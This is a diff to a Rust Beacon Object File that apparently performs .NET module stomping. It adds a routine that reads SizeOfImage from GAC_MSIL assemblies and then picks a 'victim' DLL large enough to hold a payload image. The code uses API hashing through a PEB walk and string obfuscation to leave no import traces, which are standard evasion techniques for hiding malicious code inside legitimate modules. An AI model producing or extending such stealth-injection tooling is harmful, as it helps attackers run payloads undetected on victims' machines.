@@ -723,10 +723,134 @@ unsafe fn create_bof_state(name: &[u8], state: &BofState) -> Result<(), BofError
 
 struct VictimCandidate {
     identity_wide: Vec<u16>,
-    #[allow(dead_code)]
     dll_name_a: Vec<u8>,
-    #[allow(dead_code)]
     version_dir: Vec<u8>,
+}
+
+/// Reads SizeOfImage from a victim DLL's GAC_MSIL disk path.
+/// Path: %SystemRoot%\Microsoft.NET\assembly\GAC_MSIL\<base>\<ver_dir>\<dll_name>
+/// All APIs via PEB walk — no import entries.
+/// Returns None on any failure; caller uses usize::MAX as fallback.
+unsafe fn read_victim_size_from_gac(candidate: &VictimCandidate) -> Option<usize> {
+    unsafe {
+        type GetEnvAFn = unsafe extern "system" fn(*const u8, *mut u8, u32) -> u32;
+        type CreateFileAFn = unsafe extern "system" fn(
+            *const u8, u32, u32, *mut c_void, u32, u32, *mut c_void,
+        ) -> *mut c_void;
+        type ReadFileFn = unsafe extern "system" fn(
+            *mut c_void, *mut c_void, u32, *mut u32, *mut c_void,
+        ) -> i32;
+        type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
+
+        let get_env = peb_fn::<GetEnvAFn>(hash!("kernel32.dll"), hash!("GetEnvironmentVariableA"))?;
+        let create_file = peb_fn::<CreateFileAFn>(hash!("kernel32.dll"), hash!("CreateFileA"))?;
+        let read_file = peb_fn::<ReadFileFn>(hash!("kernel32.dll"), hash!("ReadFile"))?;
+        let close_handle = peb_fn::<CloseHandleFn>(hash!("kernel32.dll"), hash!("CloseHandle"))?;
+
+        // 1. Get %SystemRoot% (e.g. "C:\Windows")
+        let sysroot_key = obf!("SystemRoot\0");
+        let mut sysroot_buf = [0u8; 260];
+        let n = get_env(sysroot_key.as_bytes().as_ptr(), sysroot_buf.as_mut_ptr(), 260);
+        if n == 0 || n >= 260 {
+            return None;
+        }
+        let sysroot_len = n as usize;
+
+        // 2. DLL name without null terminator and without ".dll" extension
+        let dll_name: &[u8] = {
+            let raw = &candidate.dll_name_a;
+            let end = raw.iter().position(|&b| b == 0).unwrap_or(raw.len());
+            &raw[..end]
+        };
+        let dll_base: &[u8] = if dll_name.ends_with(b".dll") || dll_name.ends_with(b".DLL") {
+            &dll_name[..dll_name.len() - 4]
+        } else {
+            dll_name
+        };
+
+        // 3. Version dir without null terminator
+        let ver_dir: &[u8] = {
+            let raw = &candidate.version_dir;
+            let end = raw.iter().position(|&b| b == 0).unwrap_or(raw.len());
+            &raw[..end]
+        };
+
+        // 4. Build path: sysroot + \Microsoft.NET\assembly\GAC_MSIL\ + base + \ + ver + \ + dll
+        let prefix = obf!("\\Microsoft.NET\\assembly\\GAC_MSIL\\");
+        let total_len = sysroot_len
+            + prefix.as_bytes().len()
+            + dll_base.len() + 1
+            + ver_dir.len() + 1
+            + dll_name.len() + 1;
+
+        if total_len > 520 {
+            return None;
+        }
+
+        let mut path: Vec<u8> = Vec::with_capacity(total_len);
+        path.extend_from_slice(&sysroot_buf[..sysroot_len]);
+        path.extend_from_slice(prefix.as_bytes());
+        path.extend_from_slice(dll_base);
+        path.push(b'\\');
+        path.extend_from_slice(ver_dir);
+        path.push(b'\\');
+        path.extend_from_slice(dll_name);
+        path.push(0); // null terminator
+
+        // 5. Open file — GENERIC_READ=0x80000000, FILE_SHARE_READ|WRITE=0x3,
+        //    OPEN_EXISTING=3, FILE_ATTRIBUTE_NORMAL=128
+        let h = create_file(
+            path.as_ptr(),
+            0x80000000u32,
+            0x3,
+            core::ptr::null_mut(),
+            3,
+            128,
+            core::ptr::null_mut(),
+        );
+        let invalid = usize::MAX as *mut c_void;
+        if h == invalid || h.is_null() {
+            return None;
+        }
+
+        // 6. Read first 1024 bytes (enough for PE headers)
+        let mut hdr_buf = [0u8; 1024];
+        let mut n_read: u32 = 0;
+        let ok = read_file(
+            h,
+            hdr_buf.as_mut_ptr() as *mut c_void,
+            1024,
+            &mut n_read,
+            core::ptr::null_mut(),
+        );
+        close_handle(h);
+
+        if ok == 0 || n_read < 64 {
+            return None;
+        }
+
+        // 7. Parse SizeOfImage from PE Optional Header
+        // SizeOfImage is at offset +56 from start of Optional Header.
+        // Offset is identical for PE32 and PE32+.
+        if hdr_buf[0] != b'M' || hdr_buf[1] != b'Z' {
+            return None;
+        }
+        let e_lfanew = u32::from_le_bytes([
+            hdr_buf[0x3C], hdr_buf[0x3D], hdr_buf[0x3E], hdr_buf[0x3F],
+        ]) as usize;
+        let opt = e_lfanew + 24;
+        if opt + 60 > n_read as usize {
+            return None;
+        }
+        let size_of_image = u32::from_le_bytes([
+            hdr_buf[opt + 56],
+            hdr_buf[opt + 57],
+            hdr_buf[opt + 58],
+            hdr_buf[opt + 59],
+        ]) as usize;
+
+        if size_of_image == 0 { None } else { Some(size_of_image) }
+    }
 }
 
 fn victim_candidates(clr_major: u8) -> Vec<VictimCandidate> {
@@ -1180,18 +1304,32 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
         let _ = (custom_host, hc_obj, host_objs);
 
         let candidates = victim_candidates(input.clr_major);
-        // First-candidate strategy. Future revisions may probe additional
-        // candidates if Load_2 fails on the chosen identity.
-        let chosen_identity: Option<Vec<u16>> = candidates.first().map(|cand| {
-            cand.identity_wide
-                .iter()
-                .copied()
-                .take_while(|&c| c != 0)
-                .collect()
-        });
+
+        // Select victim: first candidate whose SizeOfImage >= payload image size.
+        // read_victim_size_from_gac returns None on GAC path failure;
+        // usize::MAX fallback accepts any large-enough mapping unconditionally.
+        let mut chosen_identity: Option<Vec<u16>> = None;
+        let mut chosen_victim_size: usize = usize::MAX;
+
+        for cand in &candidates {
+            let victim_sz = read_victim_size_from_gac(cand).unwrap_or(usize::MAX);
+            crate::dlog2(b"[stomp] victim candidate checked");
+            if victim_sz >= payload_image_size {
+                chosen_identity = Some(
+                    cand.identity_wide
+                        .iter()
+                        .copied()
+                        .take_while(|&c| c != 0)
+                        .collect(),
+                );
+                chosen_victim_size = victim_sz;
+                break;
+            }
+        }
+
         let identity_slice = chosen_identity
             .as_deref()
-            .ok_or(BofError::Clr { hr: -1, op: "v0" })?;
+            .ok_or(BofError::Clr { hr: -1, op: "vs0" })?;
 
         // oleaut32.dll is needed for SysAllocStringLen (BSTR creation). CLR does not
         // load it during EEStartup on all targets; load it now if absent.
@@ -1248,6 +1386,7 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
 
         let mut io_ch = crate::io::IoChannel::open(false, "", input.pipe_name)?;
 
+        (*sp_obj).victim_image_size = chosen_victim_size;
         core::ptr::write_volatile(&mut (*sp_obj).pending, 1);
         core::ptr::write_volatile(&mut (*sp_obj).stomped, 0);
 
